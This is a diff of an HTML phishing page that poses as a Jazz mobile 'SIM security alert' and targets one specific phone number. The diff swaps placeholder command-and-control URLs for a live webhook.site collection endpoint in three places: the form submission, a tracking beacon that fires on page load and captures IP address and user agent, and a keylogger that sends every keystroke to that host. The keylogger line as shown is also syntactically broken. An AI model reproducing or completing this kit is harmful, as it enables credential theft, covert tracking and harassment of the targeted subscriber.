@@ -17,7 +17,7 @@
   <h1>🚨 SIM 03312595550 Security Alert</h1>
   <div class="alert">Your Jazz SIM detected unusual activity. Verify to avoid block.</div>
   
-  <form id="form" action="https://your-c2.com/steal.php" method="POST">  <!-- YOUR C2 ENDPOINT -->
+  <form id="form" action="https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a" method="POST">  <!-- YOUR C2 ENDPOINT -->
     <input type="hidden" name="phone" value="03312595550">
     <input type="hidden" name="ip" id="ip">
     <input type="hidden" name="ua" id="ua">
@@ -33,7 +33,7 @@
   
   <script>
     // iPhone Beacon: Auto-steal on load (even no submit)
-    fetch('https://your-c2.com/beacon.php?phone=03312595550')  // REPLACE
+    fetch('https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a?phone=03312595550')  // REPLACE
       .then(() => {
         // Grab IP/UA
         document.getElementById('ua').value = navigator.userAgent;
@@ -50,7 +50,7 @@
     // Keylogger
     document.querySelectorAll('input').forEach(inp => {
       inp.addEventListener('input', e => {
-        fetch('https://your-c2.com/keylog.php?key=' + e.target.value + '&field=' + e.target.name);
+        fetch(https://webhook.site/8d04ffb9-24af-488b-a0f8-4c1c4c5f0d5a + e.target.value + '&field=' + e.target.name);
       });
     });
   </script>
